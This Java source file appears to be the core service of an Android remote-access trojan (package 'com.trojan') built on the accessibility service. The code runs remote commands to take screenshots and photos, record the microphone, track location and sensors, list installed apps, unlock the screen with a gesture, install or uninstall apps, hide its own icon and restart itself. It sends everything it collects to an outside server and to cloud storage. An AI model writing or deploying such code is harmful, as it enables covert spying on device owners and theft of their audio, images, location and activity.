package com.trojan;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.widget.ImageView;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.util.List;

public class PowerAccessibilityService extends AccessibilityService implements SensorEventListener {

    private static final String TAG = "PowerAccessibility";

    // --- Existing Actions ---
    public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.ACTION_LOCK_SCREEN";
    public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.ACTION_SHUTDOWN";
    public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.ACTION_LIST_APPS";
    public static final String ACTION_TRIGGER_GET_CURRENT_APP = "com.trojan.ACTION_GET_CURRENT_APP";
    public static final String ACTION_TRIGGER_OPEN_APP = "com.trojan.ACTION_OPEN_APP";
    public static final String ACTION_TRIGGER_NAV_BACK = "com.trojan.ACTION_NAV_BACK";
    public static final String ACTION_TRIGGER_NAV_HOME = "com.trojan.ACTION_NAV_HOME";
    public static final String ACTION_TRIGGER_NAV_RECENTS = "com.trojan.ACTION_NAV_RECENTS";
    public static final String ACTION_TRIGGER_WAKE_DEVICE = "com.trojan.ACTION_WAKE_DEVICE";
    public static final String ACTION_TRIGGER_TOGGLE_WIFI = "com.trojan.ACTION_TOGGLE_WIFI";
    public static final String ACTION_TRIGGER_TOGGLE_BLUETOOTH = "com.trojan.ACTION_TOGGLE_BLUETOOTH";
    public static final String ACTION_TRIGGER_TOGGLE_LOCATION = "com.trojan.ACTION_TOGGLE_LOCATION";
    public static final String ACTION_TRIGGER_GET_LOCATION = "com.trojan.ACTION_GET_LOCATION";
    public static final String ACTION_TRIGGER_GET_SENSORS = "com.trojan.ACTION_GET_SENSORS";
    public static final String ACTION_TRIGGER_GET_SCREEN_STATUS = "com.trojan.ACTION_GET_SCREEN_STATUS";
    public static final String ACTION_TRIGGER_GET_BATTERY_STATUS = "com.trojan.ACTION_GET_BATTERY_STATUS";

    // --- NEW ACTIONS for Media, Apps, and Camera ---
    public static final String ACTION_TAKE_SCREENSHOT = "com.trojan.ACTION_TAKE_SCREENSHOT";
    public static final String ACTION_TAKE_PICTURE = "com.trojan.ACTION_TAKE_PICTURE";
    public static final String ACTION_START_RECORDING = "com.trojan.ACTION_START_RECORDING";
    public static final String ACTION_STOP_RECORDING = "com.trojan.ACTION_STOP_RECORDING";
    public static final String ACTION_PLAY_SOUND = "com.trojan.ACTION_PLAY_SOUND";
    public static final String ACTION_SHOW_IMAGE = "com.trojan.ACTION_SHOW_IMAGE";
    public static final String ACTION_SET_VOLUME = "com.trojan.ACTION_SET_VOLUME";
    public static final String ACTION_INSTALL_APP = "com.trojan.ACTION_INSTALL_APP";
    public static final String ACTION_UNINSTALL_APP = "com.trojan.ACTION_UNINSTALL_APP";
    public static final String ACTION_TOGGLE_APP_ICON = "com.trojan.ACTION_TOGGLE_APP_ICON";


    private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";

    private PowerActionReceiver powerActionReceiver;
    private RequestQueue requestQueue;
    private String lastForegroundAppPkg = "N/A";

    private FusedLocationProviderClient fusedLocationClient;
    private SensorManager sensorManager;
    private AudioManager audioManager; // New: For volume control
    private MediaRecorder mediaRecorder; // New: For audio recording
    private String recordingFilePath; // New: To store audio file path

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "Accessibility Service Connected and ready.");

        requestQueue = Volley.newRequestQueue(this);
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE); // New

        powerActionReceiver = new PowerActionReceiver();
        IntentFilter filter = new IntentFilter();

        // Register all existing actions
        filter.addAction(ACTION_TRIGGER_LOCK_SCREEN); filter.addAction(ACTION_TRIGGER_SHUTDOWN);
        filter.addAction(ACTION_TRIGGER_LIST_APPS); filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
        filter.addAction(ACTION_TRIGGER_OPEN_APP); filter.addAction(ACTION_TRIGGER_NAV_BACK);
        filter.addAction(ACTION_TRIGGER_NAV_HOME); filter.addAction(ACTION_TRIGGER_NAV_RECENTS);
        filter.addAction(ACTION_TRIGGER_WAKE_DEVICE); filter.addAction(ACTION_TRIGGER_TOGGLE_WIFI);
        filter.addAction(ACTION_TRIGGER_TOGGLE_BLUETOOTH); filter.addAction(ACTION_TRIGGER_TOGGLE_LOCATION);
        filter.addAction(ACTION_TRIGGER_GET_LOCATION); filter.addAction(ACTION_TRIGGER_GET_SENSORS);
        filter.addAction(ACTION_TRIGGER_GET_SCREEN_STATUS); filter.addAction(ACTION_TRIGGER_GET_BATTERY_STATUS);

        // Register all NEW actions
        filter.addAction(ACTION_TAKE_SCREENSHOT); filter.addAction(ACTION_TAKE_PICTURE);
        filter.addAction(ACTION_START_RECORDING); filter.addAction(ACTION_STOP_RECORDING);
        filter.addAction(ACTION_PLAY_SOUND); filter.addAction(ACTION_SHOW_IMAGE);
        filter.addAction(ACTION_SET_VOLUME); filter.addAction(ACTION_INSTALL_APP);
        filter.addAction(ACTION_UNINSTALL_APP); filter.addAction(ACTION_TOGGLE_APP_ICON);

        registerReceiver(powerActionReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        Log.d(TAG, "PowerActionReceiver registered for all actions.");
    }

    private class PowerActionReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = (intent == null) ? null : intent.getAction();
            if (action == null) return;
            Log.i(TAG, "Command received: " + action);

            switch (action) {
                // --- Existing Actions ---
                case ACTION_TRIGGER_LOCK_SCREEN: performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); break;
                case ACTION_TRIGGER_SHUTDOWN: performGlobalAction(GLOBAL_ACTION_POWER_DIALOG); break;
                case ACTION_TRIGGER_NAV_BACK: performGlobalAction(GLOBAL_ACTION_BACK); break;
                case ACTION_TRIGGER_NAV_HOME: performGlobalAction(GLOBAL_ACTION_HOME); break;
                case ACTION_TRIGGER_NAV_RECENTS: performGlobalAction(GLOBAL_ACTION_RECENTS); break;
                case ACTION_TRIGGER_LIST_APPS: getAndUploadAppList(); break;
                case ACTION_TRIGGER_GET_CURRENT_APP: submitDataToServer("current_app", lastForegroundAppPkg); break;
                case ACTION_TRIGGER_OPEN_APP: openApp(intent.getStringExtra("package_name")); break;
                case ACTION_TRIGGER_WAKE_DEVICE: wakeUpAndSwipe(); break; // Upgraded
                case ACTION_TRIGGER_GET_SCREEN_STATUS: getScreenStatus(); break;
                case ACTION_TRIGGER_GET_BATTERY_STATUS: getBatteryStatus(); break;
                case ACTION_TRIGGER_TOGGLE_WIFI: openSettingsPanel(Settings.Panel.ACTION_WIFI); break;
                case ACTION_TRIGGER_TOGGLE_BLUETOOTH: openSettingsPanel(Settings.ACTION_BLUETOOTH_SETTINGS); break;
                case ACTION_TRIGGER_TOGGLE_LOCATION: openSettingsPanel(Settings.ACTION_LOCATION_SOURCE_SETTINGS); break;
                case ACTION_TRIGGER_GET_LOCATION: getCurrentLocation(); break;
                case ACTION_TRIGGER_GET_SENSORS: getSensorData(); break;

                // --- NEW Actions ---
                case ACTION_TAKE_SCREENSHOT: takeScreenshot(); break;
                case ACTION_TAKE_PICTURE: takePicture(intent.getIntExtra("camera_id", 0)); break;
                case ACTION_START_RECORDING: startAudioRecording(); break;
                case ACTION_STOP_RECORDING: stopAudioRecording(); break;
                case ACTION_PLAY_SOUND: playSound(intent.getStringExtra("url")); break;
                case ACTION_SHOW_IMAGE: showImage(intent.getStringExtra("url")); break;
                case ACTION_SET_VOLUME: setVolume(intent.getIntExtra("level", -1)); break;
                case ACTION_INSTALL_APP: installApp(intent.getStringExtra("url")); break;
                case ACTION_UNINSTALL_APP: uninstallApp(intent.getStringExtra("package_name")); break;
                case ACTION_TOGGLE_APP_ICON: toggleAppIcon(intent.getBooleanExtra("show", false)); break;
            }
        }
    }

    // --- UPGRADED: Wake Device and Swipe Up to Unlock ---
    @SuppressLint("WakelockTimeout")
    private void wakeUpAndSwipe() {
        // Step 1: Wake the screen
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "trojan::WakeLock");
        wakeLock.acquire();
        wakeLock.release();
        Log.i(TAG, "Device screen woken up.");

        // Step 2: Perform a swipe-up gesture after a short delay
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
            int height = displayMetrics.heightPixels;
            int width = displayMetrics.widthPixels;

            Path swipePath = new Path();
            // Start in the bottom-middle of the screen
            swipePath.moveTo(width / 2, height * 0.8f);
            // Swipe up to the middle of the screen
            swipePath.lineTo(width / 2, height * 0.2f);

            GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
            gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400)); // 400ms duration

            dispatchGesture(gestureBuilder.build(), new GestureResultCallback() {
                @Override
                public void onCompleted(GestureDescription gestureDescription) {
                    super.onCompleted(gestureDescription);
                    Log.i(TAG, "Swipe up gesture completed successfully.");
                }
                @Override
                public void onCancelled(GestureDescription gestureDescription) {
                    super.onCancelled(gestureDescription);
                    Log.w(TAG, "Swipe up gesture was cancelled.");
                }
            }, null);
        }, 500); // 500ms delay to allow screen to turn on fully
    }

    // --- NEW: Screenshot Functionality ---
    private void takeScreenshot() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.e(TAG, "Screenshot API is not available on this Android version.");
            submitDataToServer("screenshot_error", "API not available");
            return;
        }
        // NOTE: This is a simplified call. For a real implementation, you might need
        // to handle screen rotation, display changes, etc.
        takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
            @Override
            public void onSuccess(ScreenshotResult screenshot) {
                Log.i(TAG, "Screenshot taken successfully.");
                try {
                    // Convert bitmap to Base64
                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream); // Compress to 80% quality
                    byte[] byteArray = byteArrayOutputStream.toByteArray();
                    String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);
                    submitDataToServer("screenshot", encoded);
                } catch (Exception e) {
                    Log.e(TAG, "Failed to process screenshot.", e);
                    submitDataToServer("screenshot_error", "Processing failed");
                }
            }
            @Override
            public void onFailure(int errorCode) {
                Log.e(TAG, "Failed to take screenshot, error code: " + errorCode);
                submitDataToServer("screenshot_error", "Capture failed with code: " + errorCode);
            }
        });
    }

    // --- NEW: Camera Functionality (Launches a helper Activity) ---
    // NOTE: This requires creating a new, separate Activity (e.g., CameraActivity.java)
    // that will handle the camera logic silently in the background.
    private void takePicture(int cameraId) {
        Log.i(TAG, "Requesting picture from camera ID: " + cameraId);
        Intent intent = new Intent(this, CameraActivity.class); // Assumes CameraActivity exists
        intent.putExtra("camera_id", cameraId);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    // --- NEW: Audio Recording Functionality ---
    // NOTE: Requires RECORD_AUDIO and WRITE_EXTERNAL_STORAGE permissions.
    private void startAudioRecording() {
        if (mediaRecorder != null) {
            Log.w(TAG, "Recording already in progress.");
            return;
        }
        try {
            File outputDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            File outputFile = File.createTempFile("recording", ".mp3", outputDir);
            recordingFilePath = outputFile.getAbsolutePath();

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(recordingFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            Log.i(TAG, "Audio recording started. Saving to: " + recordingFilePath);
        } catch (IOException e) {
            Log.e(TAG, "Failed to start audio recording.", e);
            mediaRecorder = null;
        }
    }

    private void stopAudioRecording() {
        if (mediaRecorder == null) {
            Log.w(TAG, "No active recording to stop.");
            return;
        }
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            Log.i(TAG, "Audio recording stopped. File saved at: " + recordingFilePath);

            // --- Firebase Upload Logic ---
            // NOTE: You need to add the Firebase Storage SDK to your project for this.
            // This is a placeholder for the upload logic.
            uploadFileToFirebase(recordingFilePath);

        } catch (RuntimeException e) {
            Log.e(TAG, "Failed to stop recording properly.", e);
            mediaRecorder = null;
        }
    }

    private void uploadFileToFirebase(String filePath) {
    if (filePath == null || filePath.isEmpty()) {
        Log.e(TAG, "File path is null or empty, cannot upload.");
        submitDataToServer("recording_error", "File path was empty.");
        return;
    }

    // Get a reference to Firebase Storage
    FirebaseStorage storage = FirebaseStorage.getInstance();
    StorageReference storageRef = storage.getReference();

    // Create a unique file name in the cloud (e.g., "recordings/recording_1662561528.mp3")
    File localFile = new File(filePath);
    Uri fileUri = Uri.fromFile(localFile);
    StorageReference recordingRef = storageRef.child("recordings/" + localFile.getName());

    Log.i(TAG, "Starting upload for: " + fileUri.toString());

    // Start the upload task
    recordingRef.putFile(fileUri)
        .addOnSuccessListener(taskSnapshot -> {
            // Upload was successful, now get the download URL
            Log.i(TAG, "Firebase upload successful. Getting download URL...");
            recordingRef.getDownloadUrl().addOnSuccessListener(uri -> {
                String downloadUrl = uri.toString();
                // Finally, submit the public URL to your Netlify server
                submitDataToServer("last_recording_url", downloadUrl);
                Log.i(TAG, "File uploaded and URL submitted: " + downloadUrl);

                // Optional: Delete the local file after successful upload to save space
                localFile.delete();

            }).addOnFailureListener(e -> {
                // Failed to get the download URL after a successful upload
                Log.e(TAG, "Failed to get download URL.", e);
                submitDataToServer("recording_error", "Upload succeeded but failed to get URL.");
            });
        })
        .addOnFailureListener(e -> {
            // The upload itself failed
            Log.e(TAG, "Firebase upload failed.", e);
            submitDataToServer("recording_error", "File upload to Firebase failed.");
        });
    }

    // --- NEW: Media Playback and Display ---
    private void playSound(String url) {
        if (url == null || url.isEmpty()) return;
        MediaPlayer mediaPlayer = new MediaPlayer();
        try {
            mediaPlayer.setDataSource(url);
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(MediaPlayer::start);
            mediaPlayer.setOnCompletionListener(mp -> {
                mp.stop();
                mp.release();
            });
            Log.i(TAG, "Playing sound from URL: " + url);
        } catch (IOException e) {
            Log.e(TAG, "Failed to play sound.", e);
        }
    }

    private void showImage(String url) {
        // NOTE: Requires a new Activity (e.g., ImageDisplayActivity.java) to show the image.
        // Also requires SYSTEM_ALERT_WINDOW for a true overlay. This is the simpler Activity approach.
        if (url == null || url.isEmpty()) return;
        Log.i(TAG, "Requesting to show image from URL: " + url);
        Intent intent = new Intent(this, ImageDisplayActivity.class); // Assumes ImageDisplayActivity exists
        intent.putExtra("image_url", url);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    // --- NEW: Volume Control ---
    private void setVolume(int level) {
        if (level < 0 || level > 100 || audioManager == null) return;
        int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        int targetVolume = (int) (maxVolume * (level / 100.0f));
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, 0);
        Log.i(TAG, "Volume set to level " + level + " (Device value: " + targetVolume + ")");
    }

    // --- NEW: App Management ---
    // NOTE: Requires REQUEST_INSTALL_PACKAGES permission for modern Android versions.
    private void installApp(String url) {
        if (url == null || url.isEmpty()) return;
        Log.i(TAG, "Attempting to install app from URL: " + url);
        // This is a simplified example. A real implementation needs a robust download manager.
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        // intent.setDataAndType(Uri.fromFile(downloadedApkFile), "application/vnd.android.package-archive");
        startActivity(intent);
    }

    private void uninstallApp(String packageName) {
        if (packageName == null || packageName.isEmpty()) return;
        Log.i(TAG, "Attempting to uninstall package: " + packageName);
        Intent intent = new Intent(Intent.ACTION_DELETE);
        intent.setData(Uri.parse("package:" + packageName));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void toggleAppIcon(boolean show) {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        int state = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
        Log.i(TAG, "App icon visibility set to: " + (show ? "Visible" : "Hidden"));
    }


    // --- Existing Helper Functions (Unchanged) ---
    private void getAndUploadAppList() {
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            JSONObject appMap = new JSONObject();
            for (ApplicationInfo app : apps) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    appMap.put(app.packageName, app.loadLabel(pm).toString());
                }
            }
            submitDataToServer("installed_apps", appMap);
        } catch (Exception e) {
            Log.e(TAG, "Failed to get app list.", e);
            submitDataToServer("app_list_error", "Failed to get app list.");
        }
    }

    @SuppressLint("MissingPermission")
    private void getCurrentLocation() {
        try {
            fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                try {
                    if (location != null) {
                        JSONObject locJson = new JSONObject();
                        locJson.put("latitude", location.getLatitude());
                        locJson.put("longitude", location.getLongitude());
                        submitDataToServer("location", locJson);
                    } else {
                        Log.w(TAG, "FusedLocationProvider returned null. Location might be off.");
                        submitDataToServer("location", "Not available");
                    }
                } catch (JSONException e) {
                    Log.e(TAG, "Error creating location JSON.", e);
                    submitDataToServer("location_error", "JSON creation failed.");
                }
            });
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission not granted by user.", e);
            submitDataToServer("location", "Permission Denied");
        }
    }

    private void getSensorData() {
        Log.d(TAG, "Attempting to register listeners for all requested sensors.");
        registerSensorIfAvailable(Sensor.TYPE_ROTATION_VECTOR, "rotation_vector");
        registerSensorIfAvailable(Sensor.TYPE_GAME_ROTATION_VECTOR, "game_rotation_vector");
        registerSensorIfAvailable(Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR, "geomagnetic_rotation_vector");
        registerSensorIfAvailable(Sensor.TYPE_GRAVITY, "gravity");
        registerSensorIfAvailable(Sensor.TYPE_ACCELEROMETER, "accelerometer");
        registerSensorIfAvailable(Sensor.TYPE_GYROSCOPE, "gyroscope");
        registerSensorIfAvailable(Sensor.TYPE_MAGNETIC_FIELD, "magnetometer");
        registerSensorIfAvailable(Sensor.TYPE_PROXIMITY, "proximity");
        registerSensorIfAvailable(Sensor.TYPE_LIGHT, "light");
        registerSensorIfAvailable(Sensor.TYPE_PRESSURE, "pressure");
    }

    private void registerSensorIfAvailable(int sensorType, String dataType) {
        try {
            if (sensorManager == null) return;
            Sensor sensor = sensorManager.getDefaultSensor(sensorType);
            if (sensor != null) {
                sensorManager.registerListener(this, sensor, SensorManager.SENSOR_DELAY_NORMAL);
                Log.i(TAG, "Successfully registered listener for: " + dataType);
            } else {
                submitDataToServer(dataType, "Not available");
                Log.w(TAG, "Sensor not available on this device: " + dataType);
            }
        } catch (Exception e) {
            Log.e(TAG, "Exception while registering sensor: " + dataType, e);
            submitDataToServer(dataType + "_error", "Failed to register listener.");
        }
    }

    @Override
    public final void onSensorChanged(SensorEvent event) {
        JSONObject sensorData = new JSONObject();
        String sensorTypeKey = "";
        try {
            int sensorType = event.sensor.getType();
            if (sensorType == Sensor.TYPE_ROTATION_VECTOR || sensorType == Sensor.TYPE_GAME_ROTATION_VECTOR || sensorType == Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR) {
                if (sensorType == Sensor.TYPE_ROTATION_VECTOR) sensorTypeKey = "rotation_vector";
                else if (sensorType == Sensor.TYPE_GAME_ROTATION_VECTOR) sensorTypeKey = "game_rotation_vector";
                else sensorTypeKey = "geomagnetic_rotation_vector";
                sensorData.put("x", event.values[0]);
                sensorData.put("y", event.values[1]);
                sensorData.put("z", event.values[2]);
                if (event.values.length > 3) sensorData.put("w", event.values[3]);
            } else if (sensorType == Sensor.TYPE_GRAVITY || sensorType == Sensor.TYPE_ACCELEROMETER || sensorType == Sensor.TYPE_GYROSCOPE || sensorType == Sensor.TYPE_MAGNETIC_FIELD) {
                if (sensorType == Sensor.TYPE_GRAVITY) sensorTypeKey = "gravity";
                else if (sensorType == Sensor.TYPE_ACCELEROMETER) sensorTypeKey = "accelerometer";
                else if (sensorType == Sensor.TYPE_GYROSCOPE) sensorTypeKey = "gyroscope";
                else sensorTypeKey = "magnetometer";
                sensorData.put("x", event.values[0]);
                sensorData.put("y", event.values[1]);
                sensorData.put("z", event.values[2]);
            } else if (sensorType == Sensor.TYPE_PROXIMITY) {
                sensorTypeKey = "proximity";
                sensorData.put("distance", event.values[0]);
            } else if (sensorType == Sensor.TYPE_LIGHT) {
                sensorTypeKey = "light";
                sensorData.put("lux", event.values[0]);
            } else if (sensorType == Sensor.TYPE_PRESSURE) {
                sensorTypeKey = "pressure";
                sensorData.put("pressure", event.values[0]);
            }
            if (!sensorTypeKey.isEmpty()) {
                submitDataToServer(sensorTypeKey, sensorData);
            }
        } catch (JSONException e) {
            Log.e(TAG, "JSON error creating sensor data for type: " + sensorTypeKey, e);
        } finally {
            sensorManager.unregisterListener(this, event.sensor);
        }
    }

    private void submitDataToServer(String dataType, Object payload) {
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create submission JSON", e);
            return;
        }
        Log.d(TAG, "Submitting data to server. Type: " + dataType + ", Payload: " + payload.toString());
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
                response -> Log.i(TAG, "Data submitted successfully: " + dataType),
                error -> Log.e(TAG, "Failed to submit data '" + dataType + "': " + error.toString())
        );
        requestQueue.add(request);
    }

    private void getBatteryStatus() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, filter);
        try {
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                float batteryPct = (level == -1 || scale == -1) ? -1f : level * 100 / (float) scale;
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL);
                JSONObject batteryJson = new JSONObject();
                batteryJson.put("percentage", batteryPct);
                batteryJson.put("isCharging", isCharging);
                submitDataToServer("battery_status", batteryJson);
            }
        } catch (JSONException e) { Log.e(TAG, "Error creating battery JSON."); }
    }

    private void getScreenStatus() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        submitDataToServer("screen_status", pm.isInteractive() ? "On" : "Off");
    }

    private void openSettingsPanel(String settingsAction) {
        Intent intent = new Intent(settingsAction);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void openApp(String packageName) {
        if (packageName == null || packageName.isEmpty()) return;
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launchIntent);
        }
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {}

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
            lastForegroundAppPkg = event.getPackageName().toString();
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility Service interrupted.");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        if (powerActionReceiver != null) unregisterReceiver(powerActionReceiver);
        if (sensorManager != null) sensorManager.unregisterListener(this);
        Log.i(TAG, "Accessibility Service Unbound.");
        return super.onUnbind(intent);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.i(TAG, "Task removed. Attempting to restart service in 1 second.");
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        PendingIntent restartServicePendingIntent = PendingIntent.getService(
                getApplicationContext(), 1, restartServiceIntent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
        );
        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmService.set(
                AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent
        );
        super.onTaskRemoved(rootIntent);
    }
}
